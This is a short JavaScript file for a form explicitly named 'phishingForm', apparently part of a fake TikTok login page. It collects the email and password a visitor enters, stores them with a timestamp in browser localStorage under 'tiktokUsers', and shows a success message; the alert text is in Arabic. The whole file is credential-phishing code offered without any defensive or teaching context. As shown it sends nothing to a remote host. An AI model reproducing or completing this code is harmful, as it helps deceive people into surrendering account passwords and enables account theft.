let users = JSON.parse(localStorage.getItem('tiktokUsers')) || [];

document.getElementById('phishingForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();

    if (!email || !password) {
        alert('❌ من فضلك املأ جميع البيانات.');
        return;
    }

    users.push({ email, password, date: new Date().toLocaleString() });
    localStorage.setItem('tiktokUsers', JSON.stringify(users));

    document.getElementById('successMessage').style.display = 'block';
    document.getElementById('phishingForm').reset();
});
